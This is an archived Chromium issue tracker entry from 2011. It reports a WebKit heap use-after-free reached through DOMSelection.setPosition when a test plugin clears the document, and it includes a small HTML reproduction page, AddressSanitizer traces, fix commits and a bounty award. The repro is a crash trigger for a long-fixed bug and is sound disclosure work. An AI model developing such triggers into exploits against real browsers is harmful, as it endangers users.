# Use-after-free with plugin and editing

| Field | Value |
|-------|-------|
| **Issue ID** | [40095924](https://issues.chromium.org/issues/40095924) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-10-05 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

this requires the test plugin and cleardocumentduringnew but here goes.

**VERSION**  

Chrome Version:

Chromium 16.0.901.0 (Developer Build 103965)  

OS Linux  

WebKit 535.6 (trunk@96574)  

JavaScript V8 3.6.4.1

Operating System: 64 bit linux

**REPRODUCTION CASE**  

attached

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==32223== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffdfd1ccc8 at pc 0x7ffff2dc2614 bp 0x7fffffff85f0 sp 0x7fffffff8380  

READ of size 4 at 0x7fffdfd1ccc8 thread T0  

#0 0x7ffff2dc2614 in WebCore::VisiblePosition::canonicalPosition(WebCore::Position const&) ???:0  

#1 0x7ffff2dc0336 in WebCore::VisiblePosition::init(WebCore::Position const&, WebCore::EAffinity) ???:0  

#2 0x7ffff34737df in WebCore::DOMSelection::setPosition(WebCore::Node\*, int, int&) ???:0  

#3 0x7ffff3eadfe2 in WebCore::DOMSelectionInternal::setPositionCallback(v8::Arguments const&) out/Release/obj/gen/webkit/bindings/V8DerivedSources19.cpp:0  

#4 0x7ffff1434394 in v8::internal::Builtin\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:0  

#5 0xc57ef36c14e in  

0x7fffdfd1ccc8 is located 72 bytes inside of 120-byte region [0x7fffdfd1cc80,0x7fffdfd1ccf8)  

freed by thread T0 here:  

#0 0x7ffff5dfde72 in operator delete(void\*) *asan\_rtl*  

#1 0x7ffff236c4d9 in WebCore::ContainerNode::removeChildren() ???:0  

#2 0x7ffff253f159 in WebCore::replaceChildrenWithFragment(WebCore::HTMLElement\*, WTF::PassRefPtr[WebCore::DocumentFragment](javascript:void(0);), int&) third\_party/WebKit/Source/WebCore/html/HTMLElement.cpp:0

## Attachments

- [72_inside_120.txt](attachments/72_inside_120.txt) (text/plain; charset=us-ascii, 8.1 KB)
- [72inside120.html](attachments/72inside120.html) (text/html; charset=us-ascii, 421 B)

## Timeline

### in...@chromium.org (2011-10-05)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-06)

Deconflicting based on James's comment.

### in...@chromium.org (2011-10-06)

Repro
<html>
<head>
    <script>
        function runTest() {
            var obj = document.getElementById("objectInQuestion");
            var s = window.getSelection();
            s.setPosition(obj, 0);
        }
    </script>
</head>
<body onload="runTest()">
  <div>
    <object id="objectInQuestion"></object>
    <embed type="application/x-webkit-test-netscape" cleardocumentduringnew></embed>
  </div>
</body>
</html>


ASAN:SIGILL
=================================================================
HINT: if your stack trace looks short or garbled, use ASAN_OPTIONS=fast_unwind=0
==32223== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffdfd1ccc8 at pc 0x7ffff2dc2614 bp 0x7fffffff85f0 sp 0x7fffffff8380
READ of size 4 at 0x7fffdfd1ccc8 thread T0
    #0 0x7ffff2dc2614 in WebCore::VisiblePosition::canonicalPosition(WebCore::Position const&) ???:0
    #1 0x7ffff2dc0336 in WebCore::VisiblePosition::init(WebCore::Position const&, WebCore::EAffinity) ???:0
    #2 0x7ffff34737df in WebCore::DOMSelection::setPosition(WebCore::Node*, int, int&) ???:0
    #3 0x7ffff3eadfe2 in WebCore::DOMSelectionInternal::setPositionCallback(v8::Arguments const&) out/Release/obj/gen/webkit/bindings/V8DerivedSources19.cpp:0
    #4 0x7ffff1434394 in v8::internal::Builtin_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate*) v8/src/builtins.cc:0
    #5 0xc57ef36c14e in  
0x7fffdfd1ccc8 is located 72 bytes inside of 120-byte region [0x7fffdfd1cc80,0x7fffdfd1ccf8)
freed by thread T0 here:
    #0 0x7ffff5dfde72 in operator delete(void*) _asan_rtl_
    #1 0x7ffff236c4d9 in WebCore::ContainerNode::removeChildren() ???:0
    #2 0x7ffff253f159 in WebCore::replaceChildrenWithFragment(WebCore::HTMLElement*, WTF::PassRefPtr<WebCore::DocumentFragment>, int&) third_party/WebKit/Source/WebCore/html/HTMLElement.cpp:0
    #3 0x7ffff253eb74 in WebCore::HTMLElement::setInnerHTML(WTF::String const&, int&) ???:0
    #4 0x7ffff3d3ae49 in WebCore::HTMLElementInternal::innerHTMLAttrSetter(v8::Local<v8::String>, v8::Local<v8::Value>, v8::AccessorInfo const&) out/Release/obj/gen/webkit/bindings/V8DerivedSources15.cpp:0
    #5 0x7ffff16d661d in v8::internal::JSObject::SetPropertyWithCallback(v8::internal::Object*, v8::internal::String*, v8::internal::Object*, v8::internal::JSObject*, v8::internal::StrictModeFlag) ???:0
    #6 0x7ffff16dbffe in v8::internal::JSObject::SetPropertyForResult(v8::internal::LookupResult*, v8::internal::String*, v8::internal::Object*, PropertyAttributes, v8::internal::StrictModeFlag) ???:0
    #7 0x7ffff16d5cd9 in v8::internal::JSReceiver::SetProperty(v8::internal::String*, v8::internal::Object*, PropertyAttributes, v8::internal::StrictModeFlag) ???:0
    #8 0x7ffff1ad59dc in v8::internal::StoreIC::Store(v8::internal::InlineCacheState, v8::internal::StrictModeFlag, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::Object>) ???:0
    #9 0x7ffff1add6a6 in v8::internal::StoreIC_Miss(v8::internal::Arguments, v8::internal::Isolate*) ???:0
    #10 0xc57ef36c14e in  
    #11 0xc57ef396452 in  
    #12 0xc57ef388867 in  
    #13 0xc57ef371221 in  
    #14 0x7ffff147dc54 in v8::internal::Invoke(bool, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Object***, bool*) v8/src/execution.cc:0
    #15 0x7ffff13d1505 in v8::Script::Run() ???:0
    #16 0x7ffff2a65a56 in WebCore::V8Proxy::runScript(v8::Handle<v8::Script>, bool) ???:0
    #17 0x7ffff2a64994 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node*) ???:0
    #18 0x7ffff2a17cae in _NPN_EvaluateHelper ???:0
    #19 0x7ffff1efa92d in WebKit::WebBindings::evaluateHelper(_NPP*, bool, NPObject*, _NPString*, _NPVariant*) ???:0
    #20 0x7ffff56d9ff0 in NPObjectStub::OnEvaluate(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, bool, IPC::Message*) ???:0
    #21 0x7ffff56dade4 in bool IPC::SyncMessageSchema<Tuple2<std::basic_string<char, std::char_traits<char>, std::allocator<char> >, bool>, Tuple2<NPVariant_Param&, bool&> >::DispatchDelayReplyWithSendParams<NPObjectStub, void (NPObjectStub::*)(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, bool, IPC::Message*)>(bool, Tuple2<std::basic_string<char, std::char_traits<char>, std::allocator<char> >, bool> const&, IPC::Message const*, NPObjectStub*, void (NPObjectStub::*)(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, bool, IPC::Message*)) ???:0
    #22 0x7ffff56d658a in NPObjectStub::OnMessageReceived(IPC::Message const&) ???:0
    #23 0x7ffff1e24f20 in MessageRouter::RouteMessage(IPC::Message const&) ???:0
    #24 0x7ffff56c510f in NPChannelBase::OnMessageReceived(IPC::Message const&) ???:0
    #25 0x7ffff1ea2131 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ???:0
    #26 0x7ffff1eac3b9 in IPC::SyncChannel::ReceivedSyncMsgQueue::DispatchMessages(IPC::SyncChannel::SyncContext*) ???:0
    #27 0x7ffff1eaf2d9 in IPC::SyncChannel::WaitForReply(IPC::SyncChannel::SyncContext*, base::WaitableEvent*) ???:0
    #28 0x7ffff1eaef6f in IPC::SyncChannel::SendWithTimeout(IPC::Message*, int) ???:0
previously allocated by thread T0 here:
    #0 0x7ffff5dfe23a in operator new(unsigned long) _asan_rtl_
    #1 0x7ffff271abdd in WebCore::HTMLDivElement::create(WebCore::QualifiedName const&, WebCore::Document*) ???:0
    #2 0x7ffff3ed6e46 in WebCore::divConstructor(WebCore::QualifiedName const&, WebCore::Document*, WebCore::HTMLFormElement*, bool) out/Release/obj/gen/webkit/HTMLElementFactory.cpp:0
    #3 0x7ffff3ec7458 in WebCore::HTMLElementFactory::createHTMLElement(WebCore::QualifiedName const&, WebCore::Document*, WebCore::HTMLFormElement*, bool) ???:0
    #4 0x7ffff27529cd in WebCore::HTMLConstructionSite::createHTMLElement(WebCore::AtomicHTMLToken&) ???:0
    #5 0x7ffff2753617 in WebCore::HTMLConstructionSite::insertHTMLElement(WebCore::AtomicHTMLToken&) ???:0
    #6 0x7ffff26cbe36 in WebCore::HTMLTreeBuilder::processStartTagForInBody(WebCore::AtomicHTMLToken&) ???:0
    #7 0x7ffff26b7b70 in WebCore::HTMLTreeBuilder::processStartTag(WebCore::AtomicHTMLToken&) ???:0
    #8 0x7ffff26b6bd4 in WebCore::HTMLTreeBuilder::processToken(WebCore::AtomicHTMLToken&) ???:0
    #9 0x7ffff26b6765 in WebCore::HTMLTreeBuilder::constructTreeFromAtomicToken(WebCore::AtomicHTMLToken&) ???:0
    #10 0x7ffff26b6650 in WebCore::HTMLTreeBuilder::constructTreeFromToken(WebCore::HTMLToken&) ???:0
    #11 0x7ffff266b0de in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) ???:0
    #12 0x7ffff266cd0e in WebCore::HTMLDocumentParser::append(WebCore::SegmentedString const&) ???:0
    #13 0x7ffff58f3599 in WebCore::DecodedDataDocumentParser::flush(WebCore::DocumentWriter*) ???:0
    #14 0x7ffff2f71869 in WebCore::DocumentWriter::endIfNotLoadingMainResource() ???:0
    #15 0x7ffff2fb0559 in WebCore::FrameLoader::finishedLoading() ???:0
    #16 0x7ffff2fd5611 in WebCore::MainResourceLoader::didFinishLoading(double) ???:0
    #17 0x7ffff46d1d75 in webkit_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&) ???:0
    #18 0x7ffff1e54d2c in bool ResourceMsg_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::*)(int, net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&)>(IPC::Message const*, ResourceDispatcher*, ResourceDispatcher*, void (ResourceDispatcher::*)(int, net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&)) ???:0
    #19 0x7ffff1e528f3 in ResourceDispatcher::DispatchMessage(IPC::Message const&) ???:0
    #20 0x7ffff1e50737 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) ???:0
    #21 0x7ffff1d46880 in ChildThread::OnMessageReceived(IPC::Message const&) ???:0
    #22 0x7ffff1ea2131 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ???:0
==32223== ABORTING
Shadow byte and word:
  0x1ffffbfa3999: fd
  0x1ffffbfa3998: fd fd fd fd fd fd fd fd
More shadow bytes:
  0x1ffffbfa3978: fd fd fd fd fd fd fd fd
  0x1ffffbfa3980: fa fa fa fa fa fa fa fa
  0x1ffffbfa3988: fa fa fa fa fa fa fa fa
  0x1ffffbfa3990: fd fd fd fd fd fd fd fd
=>0x1ffffbfa3998: fd fd fd fd fd fd fd fd
  0x1ffffbfa39a0: fa fa fa fa fa fa fa fa
  0x1ffffbfa39a8: fa fa fa fa fa fa fa fa
  0x1ffffbfa39b0: fd fd fd fd fd fd fd fd
  0x1ffffbfa39b8: fd fd fd fd fd fd fd fd


### in...@chromium.org (2011-10-06)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=69568

### in...@chromium.org (2011-10-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-06)

http://trac.webkit.org/changeset/96868

### in...@chromium.org (2011-10-07)

merged to m15 in r96948

### in...@chromium.org (2011-10-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-19)

Nice bug miaubiz, different from a stale style which is very refreshing :)
$1000

### sc...@gmail.com (2011-10-19)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-28)

Payment in system, can take up to a couple of weeks.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/99138?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095924)*
